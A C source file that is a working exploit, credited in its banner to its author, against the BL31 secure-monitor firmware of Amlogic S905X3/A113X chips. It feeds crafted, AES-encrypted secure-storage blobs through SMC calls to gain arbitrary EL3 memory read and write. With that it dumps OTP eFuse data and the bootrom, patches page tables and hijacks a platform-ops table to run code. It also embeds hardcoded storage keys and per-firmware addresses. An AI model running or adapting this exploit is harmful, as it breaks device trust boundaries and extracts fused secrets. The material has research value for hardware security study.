#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

#include "aes.h"
#include "sha256.h"

#define DEBUGFS_PATH "/sys/kernel/debug/hax"

#define SMC_ID_STORAGE_PARSE 0x82000069
#define SMC_ID_STORAGE_READ 0x82000061
#define SMC_ID_STORAGE_WRITE 0x82000062

#define TYPE_PARAM_HEADER 1
#define TYPE_ENCRYPTED_SIZE 2
#define TYPE_KEY_DEFINITION 3
#define TYPE_NAME_SIZE 4
#define TYPE_NAME_DATA 5
#define TYPE_VALUE_SIZE 6
#define TYPE_VALUE_DATA 7
#define TYPE_KEY_TYPE 8
#define TYPE_BUFFER_STATUS 9
#define TYPE_HASH_DATA 10
#define TYPE_UNKNOWN 11

#define F_EFUSE_READ 0x5119994

#define OTP_SIZE 0x100
#define BOOTROM_SIZE 0x10000

#define UPAT 4UL
#define LPAT 0x181UL

//#define HEAP_HEAD 0x517E8E8 #axg

#define HEAP_HEAD 0x518875C

#define PLATFORM_OPS_PTR 0x5125B88 //s905x3_LPDDR4_PHY_V_0_1_18

#define FAKE_PLATFORM_OPS_ADDR (HEAP_HEAD + 0x20000)

//#define TTBR0_EL3 0x51BF980 //axg

//#define TTBR0_EL3 0x51ba5d8 //s905x3_LPDDR4_PHY_V_0_1_18

//#define TTBR0_EL3 0x51be660 //s905x3_LPDDR4_PHY_V_0_1_21
#define TTBR0_EL3  0x51c0c40 //s905x3_LPDDR4_PHY_V_0_1_22
//#define TTBR0_EL3 0x51b8488 //s905_x2_LPDDR4_PHY_V_0_1_07

typedef unsigned char u8;
typedef unsigned int u32;
typedef unsigned long u64;

uint64_t call_smc(u32 a, u64 b, u64 c, u64 d)
{
    uint64_t rv = 0;
    FILE *f = fopen(DEBUGFS_PATH "/smc", "w");
    if (f == NULL)
    {
        printf("could not open smc\n");
        exit(-1);
    }

    fprintf(f, "%x %lx %lx %lx\n", a, b, c, d);
    fclose(f);

    f = fopen(DEBUGFS_PATH "/smc", "rb");
    if (f == NULL)
    {
        printf("could not open smc\n");
        exit(-1);
    }

    read(fileno(f), &rv, 8);
    fclose(f);

    return rv;
}

static inline void uart_put_hex(unsigned int data, unsigned bitlen)
{
    int i;
    unsigned char s;
    for (i = bitlen - 4; i >= 0; i -= 4)
    {
        if ((data >> i) == 0)
        {
            putc(0x30, stdout);
            continue;
        }
        s = (data >> i) & 0xf;
        if (s < 10)
            putc(0x30 + s, stdout);
        else
            putc(0x61 + s - 10, stdout);
    }
}

void hexdump(void *ptr, int buflen)
{
    unsigned char *buf = (unsigned char *)ptr;
    int i, j;
    for (i = 0; i < buflen; i += 16)
    {
        printf("%p: ", (ptr + i));
        putc(':', stdout);
        putc(' ', stdout);
        for (j = 0; j < 16; j++)
        {
            if (i + j < buflen)
            {
                uart_put_hex(buf[i + j], 8);
                putc(' ', stdout);
            }
            else
            {
                putc(' ', stdout);
                putc(' ', stdout);
                putc(' ', stdout);
            }
        }
        putc(' ', stdout);
        for (j = 0; j < 16; j++)
        {
            if (i + j < buflen)
            {
                if (buf[i + j] >= 0x20 && buf[i + j] <= 0x7e)
                {
                    putc(buf[i + j], stdout);
                }
                else
                {
                    putc('.', stdout);
                }
            }
        }
        putc('\n', stdout);
    }
}

void w32(u8 *p, u32 v)
{
    p[0] = (v & 0xff);
    p[1] = (v >> 8) & 0xff;
    p[2] = (v >> 16) & 0xff;
    p[3] = (v >> 24) & 0xff;
}

u32 key_entry(u8 *o, u8 *name, u8 *data, u32 data_len)
{
    u8 *so = o;
    u8 hash[32];

    memset(hash, 0, sizeof(hash));

    SHA256_CTX sha256_ctx;
    sha256_init(&sha256_ctx);
    sha256_update(&sha256_ctx, data, data_len);
    sha256_final(&sha256_ctx, hash);

    u32 sz =
        12 +             // TYPE_VALUE_SIZE
        (8 + data_len) + // TYPE_VALUE_DATA
        (8 + 32);        // TYPE_HASH_DATA

    if (name != (u8 *)0)
    {
        // TYPE_NAME_SIZE + TYPE_NAME_DATA
        sz += 12 + (8 + strlen(name));
    }

    w32(o + 0, 0x3);
    w32(o + 4, sz);
    o += 8;

    if (name != (u8 *)0)
    {
        w32(o + 0, TYPE_NAME_SIZE);
        w32(o + 4, 4);
        w32(o + 8, strlen(name));
        o += 12;

        w32(o + 0, TYPE_NAME_DATA);
        w32(o + 4, strlen(name));
        for (int i = 0; i < strlen(name); i++)
        {
            o[8 + i] = name[i];
        }
        o += 8 + strlen(name);
    }

    w32(o + 0, TYPE_VALUE_SIZE);
    w32(o + 4, 4);
    w32(o + 8, data_len);
    o += 12;

    w32(o + 0, TYPE_VALUE_DATA);
    w32(o + 4, data_len);
    memcpy(o + 8, data, data_len);
    o += 8 + data_len;

    w32(o + 0, TYPE_HASH_DATA);
    w32(o + 4, 0x20);
    memcpy(o + 8, hash, 0x20);
    o += 8 + 32;

    return (u32)((o - so) & 0xffffffff);
}

void aes256_cbc_encrypt(u8 *key, u8 *iv, u8 *buffer, uint32_t size)
{
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_encrypt_buffer(&ctx, buffer, size);
}

void fixed_encrypt(u8 *buffer, uint32_t size)
{
    static u8 key[] = {
        0xb3, 0xd3, 0x24, 0x8f, 0x6e, 0x34, 0x0c, 0x8b,
        0xca, 0xb6, 0x3f, 0x10, 0x77, 0x87, 0x5d, 0xee,
        0x9d, 0x93, 0x1d, 0x76, 0xd0, 0xd8, 0x5e, 0x98,
        0x1c, 0xf0, 0x21, 0x43, 0x8f, 0x24, 0xb6, 0x15};

    static u8 iv[] = {
        0xab, 0x75, 0x0d, 0xc4, 0x3e, 0x28, 0x40, 0xa7,
        0xf9, 0x88, 0xea, 0xd7, 0xbe, 0x30, 0xe7, 0x01};

    aes256_cbc_encrypt(key, iv, buffer, size);
}

void storage_encrypt(u8 *buffer, uint32_t size)
{
    static u8 key[] = {
        0x13, 0x22, 0x02, 0x4a, 0x55, 0x23, 0xbb, 0xcb,
        0xf1, 0xfb, 0x2a, 0xcc, 0xbb, 0x95, 0xf4, 0x50,
        0xae, 0x08, 0xd7, 0xfb, 0x80, 0xf2, 0x64, 0x72,
        0xe3, 0x3c, 0xc4, 0xb4, 0xa3, 0x50, 0xd9, 0xf1};

    static u8 iv[] = {
        0x2a, 0xde, 0xfc, 0xd7, 0x67, 0xc8, 0xde, 0xd0,
        0xf0, 0x1e, 0xe8, 0x12, 0xf9, 0x57, 0x25, 0x36};

    aes256_cbc_encrypt(key, iv, buffer, size);
}

void tlv32(uint8_t *o, uint32_t t, uint32_t l, uint32_t v)
{
    *(uint32_t *)(o + 0) = t;
    *(uint32_t *)(o + 4) = l;
    *(uint32_t *)(o + 8) = v;
}

void build_hax_storage_header(u8 *out, uint32_t encrypted_size)
{
    u8 *p_hdr = out + 0;
    u8 *p_param = out + 0x200;

    static u8 magic[11] = {
        'A', 'M', 'L', 'S', 'E', 'C', 'U', 'R', 'I', 'T', 'Y'};

    // build plaintext header
    memset(p_hdr, 0, 0x200);
    memcpy(p_hdr, magic, sizeof(magic));
    w32(p_hdr + 0x10, 0); // key version, 0 = skip sha256 of body
    w32(p_hdr + 0x14, 2); // seed mode, 2 uses the hardcoded key.

    // build plaintext param block
    memset(p_param, 0, 0x200);
    w32(p_param + 0x00, TYPE_PARAM_HEADER);
    w32(p_param + 0x04, 24); // 24 = size of next two TLVs

    w32(p_param + 0x08, TYPE_ENCRYPTED_SIZE);
    w32(p_param + 0x0c, 4);
    w32(p_param + 0x10, encrypted_size);

    w32(p_param + 0x14, TYPE_UNKNOWN);
    w32(p_param + 0x18, 4);
    w32(p_param + 0x1c, 0);

    // encrypt param block
    storage_encrypt(p_param, 0x200);
}

void build_hax_storage_header2(u8 *out, uint8_t *paramdata, size_t paramdata_len)
{
    u8 *p_hdr = out + 0;
    u8 *p_param = out + 0x200;

    static u8 magic[11] = {
        'A', 'M', 'L', 'S', 'E', 'C', 'U', 'R', 'I', 'T', 'Y'};

    // build plaintext header
    memset(p_hdr, 0, 0x200);
    memcpy(p_hdr, magic, sizeof(magic));
    w32(p_hdr + 0x10, 0); // key version, 0 = skip sha256 of body
    w32(p_hdr + 0x14, 2); // seed mode, 2 uses the hardcoded key.

    // build plaintext param block
    memset(p_param, 0, 0x200);
    memcpy(p_param, paramdata, paramdata_len);

    // encrypt param block
    storage_encrypt(p_param, 0x200);
}

void clear_procfile(char *proc_file, size_t len)
{
    FILE *f = fopen(proc_file, "wb");
    if (f == NULL)
    {
        printf("could not open file: '%s'\n", proc_file);
        exit(-1);
    }
    uint8_t *buf = malloc(len);
    memset(buf, 0xaa, len);
    fwrite(buf, len, 1, f);
    fclose(f);
    free(buf);
}

void clear_procfiles()
{
    clear_procfile(DEBUGFS_PATH "/storage", 0x800);
    clear_procfile(DEBUGFS_PATH "/haxbuf", 0x800);
    clear_procfile(DEBUGFS_PATH "/input_a", 0x800);
    clear_procfile(DEBUGFS_PATH "/input_b", 0x800);
    clear_procfile(DEBUGFS_PATH "/output_a", 0x800);
    clear_procfile(DEBUGFS_PATH "/output_b", 0x800);
}

void write_procfile(char *proc_file, uint8_t *data, size_t len)
{
    FILE *f = fopen(proc_file, "wb");
    if (f == NULL)
    {
        printf("could not open file: '%s'\n", proc_file);
        exit(-1);
    }
    fwrite(data, len, 1, f);
    fclose(f);
}

void read_procfile(char *proc_file, uint8_t *data, size_t len)
{
    FILE *f = fopen(proc_file, "rb");
    if (f == NULL)
    {
        printf("could not open file: '%s'\n", proc_file);
        exit(-1);
    }
    fread(data, len, 1, f);
    fclose(f);
}

void write_storage(uint8_t *data, size_t len)
{
    write_procfile(DEBUGFS_PATH "/storage", data, len);
}

void write_haxbuf(uint8_t *data, size_t len)
{
    write_procfile(DEBUGFS_PATH "/haxbuf", data, len);
}

void write_input_b(uint8_t *data, size_t len)
{
    write_procfile(DEBUGFS_PATH "/input_b", data, len);
}

void write_input_a(uint8_t *data, size_t len)
{
    write_procfile(DEBUGFS_PATH "/input_a", data, len);
}

void read_output_b(uint8_t *data, size_t len)
{
    read_procfile(DEBUGFS_PATH "/output_b", data, len);
}


uint64_t read64(uint64_t addr)
{
    uint8_t scratch[0x2000];
    uint8_t *pp;
    uint8_t *pp_o;

    pp = scratch + 0x400;
    pp_o = pp;

    for (int i = 0; i < 65; i += 2)
    {
    pp += key_entry(pp, "AAAA", "BBB", 4);
    pp += key_entry(pp, "AAAA", "BBB", 4);
    }

    pp += key_entry(pp, "XXXX", "CCC", 4);
    storage_encrypt(pp_o, ((pp - pp_o) + 15) & 0xfffffff0);
    build_hax_storage_header(scratch, pp - pp_o);
    write_storage(scratch, sizeof(scratch));

    uint64_t rv = call_smc(SMC_ID_STORAGE_PARSE, 0x40000, 0, 0);

    u8 fake_key[0x90 * 2];

    // overwrite key entry 33+34 using broken parse
    memset(fake_key, 0, sizeof(fake_key));
    for (int i = 0; i < 2; i++)
    {
        memcpy(fake_key + (i * 0x90), "XXXX", 4);
        w32(fake_key + (i * 0x90) + 0x50, 4);    // name_len
        w32(fake_key + (i * 0x90) + 0x5c, 8);    // value_size
        w32(fake_key + (i * 0x90) + 0x60, addr); // value_ptr
        w32(fake_key + (i * 0x90) + 0x88, 1);    // key_in_use
    }

    build_hax_storage_header2(scratch, fake_key + 8, sizeof(fake_key) - 8);
    write_storage(scratch, sizeof(scratch));

    rv = call_smc(SMC_ID_STORAGE_PARSE, 0x40000, 0, 0);

    // read key 'XXXX'
    tlv32(scratch, 4, 0x100, 0x58585858);
    write_input_b(scratch, 0x10);
    rv = call_smc(SMC_ID_STORAGE_READ, 0, 0, 0);

    read_output_b(scratch, 12);
    if (*(uint32_t *)(scratch) != 8)
    {
        printf("read64: error! %x\n", *(uint32_t *)(scratch));
        exit(-1);
    }

    return *(uint64_t *)(scratch + 4);
}

void write64(uint64_t addr, uint64_t value)
{
    uint8_t scratch[0x2000];
    uint8_t *pp;
    uint8_t *pp_o;

    pp = scratch + 0x400;
    pp_o = pp;

    for (int i = 0; i < 65; i++)
    {
        pp += key_entry(pp, "AAAA", "BBB", 4);
    }

    pp += key_entry(pp, "XXXX", "CCC", 4);
    storage_encrypt(pp_o, ((pp - pp_o) + 15) & 0xfffffff0);
    build_hax_storage_header(scratch, pp - pp_o);
    write_storage(scratch, sizeof(scratch));

    uint64_t rv = call_smc(SMC_ID_STORAGE_PARSE, 0x40000, 0, 0);

    u8 fake_key[0x90 * 2];

    // overwrite key entry 64+65 using broken parse
    memset(fake_key, 0, sizeof(fake_key));
    for (int i = 0; i < 2; i++)
    {
        memcpy(fake_key + (i * 0x90), "XXXX", 4);
        w32(fake_key + (i * 0x90) + 0x50, 4);    // name_len
        w32(fake_key + (i * 0x90) + 0x5c, 8);    // value_size
        w32(fake_key + (i * 0x90) + 0x60, addr); // value_ptr
        w32(fake_key + (i * 0x90) + 0x88, 1);    // key_in_use
    }

    build_hax_storage_header2(scratch, fake_key + 8, sizeof(fake_key) - 8);
    write_storage(scratch, sizeof(scratch));

    rv = call_smc(SMC_ID_STORAGE_PARSE, 0x40000, 0, 0);

    pp = scratch;

    w32(pp + 0x00, 0x4);   // name_len
    w32(pp + 0x04, 0x8); // value_size
    w32(pp + 0x08, 0x0);   // buffer_status
    memcpy(pp + 0x0c, "XXXX", 4);
    w32(pp + 0x10, value & 0xffffffff);
    w32(pp + 0x14, (value >> 32) & 0xffffffff);
    write_input_b(scratch, 0x20);
    rv = call_smc(SMC_ID_STORAGE_WRITE, 0, 0, 0);
}


void call3(u64 addr, u64 a, u64 b, u64 c)
{
    // install hacked platform ops table //s905x3_LPDDR4_PHY_V_0_1_18
    uint64_t platform_op_table[72] = {
	0x000000000511A220,
	0x000000000511A238,
	0x000000000511A22C,
	0x000000000511A244,
	0x000000000511FCBC,
	0x000000000511FCC4,
	0x000000000511FCCC,
	0x000000000511FCD4,
	0x000000000511FCDC,
	0x000000000511FCE4,
	0x000000000511FCEC,
	0x000000000511A250,
	0x000000000511A268,
	0x000000000511A27C,
	0x000000000511A584,
	0x000000000511A5FC,
	0x000000000511A560,
	0x000000000511A68C,
	0x000000000511A70C,
	0x000000000511A4F8,
	0x000000000511A500,
	0x000000000511CED8,
	0x000000000511D040,
	0x000000000511D280,
	0x000000000511A2A0,
	0x00000000051206EC,
	0x0000000005120718,
	0x000000000512074C,
	0x0000000005120770,
	0x0000000005120794,
	0x00000000051207B8,
	0x00000000051207DC,
	0x00000000051207E4,
	0x00000000051207FC,
	0x0000000005120814,
	0x000000000511D8EC,
	0x000000000511D974,
	0x000000000511DC24,
	0x000000000511DBD0,
	0x000000000511DBE8,
	0x000000000511DC44,
	0x000000000511DD50,
	0x000000000511DD68,
	0x000000000511DE5C,
	0x000000000511DE74,
	0x000000000511DC5C,
	0x000000000511DE78,
	0x000000000511DF28,
	0x000000000511DCF8,
	0x000000000511E0C0,
	0x0000000000000000,
	0x000000000511E0F4,
	0x000000000511E108,
	0x000000000511A2CC,
	0x000000000511A32C,
	0x0000000005119A58,
	0x0000000005119AF8,
	0x000000000511D508,
	0x000000000511D4E0,
	0x000000000511D36C,
	0x000000000511D394,
	0x000000000511D3B0,
	0x0000000000000000,
	0x0000000000000000,
	0x0000000005119B5C,
	0x0000000005120834,
	0x0000000005120838,
	0x000000000512083C,
	0x00000000051199C8,
	0x000000000511A354,
	0x000000000511A3E0,
	0x0000000000000000,
    };

    // 0x820000FF
    platform_op_table[18] = addr;

    for (int i = 0; i < 72; i++)
    {
        write64(FAKE_PLATFORM_OPS_ADDR + (i * 8), platform_op_table[i]);
    }

    write64(PLATFORM_OPS_PTR, FAKE_PLATFORM_OPS_ADDR);

    call_smc(0x820000FF, a, b, c);
}


void dump_otp(char *outputfile) {
    //printf("[+] clearing scratch..\n");
    //for (int i = 0; i < OTP_SIZE; i += 8)
    //{
    //    write64(HEAP_HEAD + 0x30000 + i, 0);
    //}

    //printf("[+] trigger OTP read..\n");
    //call3(F_EFUSE_READ, HEAP_HEAD + 0x30000, 0, 0x100);

    uint8_t otp[OTP_SIZE];
    memset(otp, 0, sizeof(otp));

    printf("[+] slurping OTP data..\n");
    for (int i = 0; i < OTP_SIZE; i += 8)
    {
        *(uint64_t *)(otp + i) = read64(0xfffe7c00 + i);
    }

    hexdump(otp, OTP_SIZE);

    FILE *f = fopen(outputfile, "wb");
    fwrite(otp, OTP_SIZE, 1, f);
    fclose(f);
}

void dump_bootrom(uint64_t ttbr0_el3, char *outputfile) {
    uint64_t l2_addr = read64(ttbr0_el3);
    l2_addr &= ~3;

    printf("[+] L2 table for c0000000-ffffffff @ %016lx\n", l2_addr);

    uint64_t l3_addr = read64(l2_addr + 0x3ff8);
    l3_addr &= ~3;

    printf("[+] L3 table for ffe00000-ffffffff @ %016lx\n", l3_addr);

    uint64_t tbl_start = 0xffe00000;
    uint64_t map_start = 0xffff0000;
    uint64_t map_end = map_start + (1024 * 64);

    printf("[+] patching pagetable to facilitate bootrom dumping..\n");
    for(uint64_t addr = map_start; addr < map_end; addr += 0x1000) {
        uint32_t index = (addr - tbl_start) / 0x1000;
        uint64_t entry = (addr & 0xfffff000) | (UPAT << 52) | (LPAT << 2) | 3;
        write64(l3_addr + (index * 8), entry);
    }
    printf("[+] done\n");

    FILE *f = fopen(outputfile, "wb");
    printf("[+] dumping bootrom..\n");
    for(uint64_t addr = map_start; addr < (map_start + BOOTROM_SIZE); addr += 8) {
        if ((addr % 0x100) == 0) {
            printf("> pos: %016lx\n", addr);
        }
        uint64_t v = read64(addr);
        fwrite(&v, 8, 1, f);
    }
    printf("[+] done!\n");
    fclose(f);
}

// Wrapper function to monitor fwrite and print live progress to both file and stdout
size_t monitor_fwrite(const void *ptr, size_t size, size_t count, FILE *file, FILE *stdout_monitor) {
    size_t result = 0;

    for (size_t i = 0; i < count; ++i) {
        result += fwrite(ptr, size, 1, file);
        //result += fwrite(ptr, size, 1, stdout_monitor);

        // Print live progress in hexadecimal format
        printf("\r[Monitor] Writing 0x%zx/0x%zx bytes...", (i + 1) * size, count * size);
        fflush(stdout);
    }

    printf("\n");
    return result;
}

void dump_mem(uint64_t dump_size, uint64_t dump_addr, char *outputfile) {
    uint8_t otp[dump_size];
    memset(otp, 0, sizeof(otp));

    printf("[+] dump data..\n");

    FILE *f = fopen(outputfile, "wb");
    if (f == NULL) {
        perror("Error opening file for writing");
        return;
    }

    FILE *stdout_monitor = stdout;

    // Calculate the number of iterations needed for the live progress monitor
    size_t iterations = dump_size / 8;

    for (size_t i = 0; i < iterations; ++i) {
        *(uint64_t *)(otp + i * 8) = read64(dump_addr + i * 8);

        // Print live progress for each iteration in hexadecimal format
        printf("\r[Monitor] Reading 0x%zx/0x%zx bytes...", (i + 1) * 8, dump_size);
        fflush(stdout);
    }

    // hexdump(otp, dump_size);
    monitor_fwrite(otp, dump_size, 1, f, stdout_monitor);

    fclose(f);

    printf("[Monitor] Reading completed.\n");
}


void banner() {
    printf("\n*** A113X BL31 exploit by blasty <peter@haxx.in> S905x3_Raxone *** \n\n");
}

void usage(char *prog) {
    printf(
        "usage:\n"
        "  %s dump_otp <output.bin>\n"
        "  %s dump_bootrom <output.bin>\n"
        "  %s dump_mem <dump_size> <dump_addr> <outputfile>\n"
        "  %s read64 <address>\n"
        "  %s write64 <address> <value>\n"
        "\n",
        prog, prog, prog, prog, prog
    );
}

int main(int argc, char *argv[]) {
    banner();

    if (argc < 3) {
        usage(argv[0]);
        return -1;
    }

    clear_procfiles();

    if (!strcmp(argv[1], "dump_otp")) {
        dump_otp(argv[2]);
    } else if (!strcmp(argv[1], "dump_bootrom")) {
        uint64_t ttbr0_el3 = TTBR0_EL3;
        dump_bootrom(ttbr0_el3, argv[2]);
    } else if (!strcmp(argv[1], "dump_mem")) {
        if (argc != 5) {
            usage(argv[0]);
            return -1;
        }

        uint64_t dump_size;
        uint64_t dump_addr;

        if (sscanf(argv[2], "%llx", &dump_size) != 1) {
            fprintf(stderr, "Error reading hexadecimal input for dump_size.\n");
            return 1;
        }

        if (sscanf(argv[3], "%llx", &dump_addr) != 1) {
            fprintf(stderr, "Error reading hexadecimal input for dump_addr.\n");
            return 1;
        }

        char *outputfile = argv[4];
        dump_mem(dump_size, dump_addr, outputfile);
    } else if (!strcmp(argv[1], "read64")) {
        if (argc != 3) {
            usage(argv[0]);
            return -1;
        }

        uint64_t a = strtoull(argv[2], NULL, 0);
        uint64_t v = read64(a);
        printf("read64 0x%016lx = 0x%016lx\n", a, v);
    } else if (!strcmp(argv[1], "write64")) {
        if (argc != 4) {
            usage(argv[0]);
            return -1;
        }

        uint64_t a = strtoull(argv[2], NULL, 0);
        uint64_t v = strtoull(argv[3], NULL, 0);
        write64(a, v);
        printf("write64 0x%016lx = 0x%016lx done\n", a, v);
    } else {
        usage(argv[0]);
        return -1;
    }

    return 0;
}
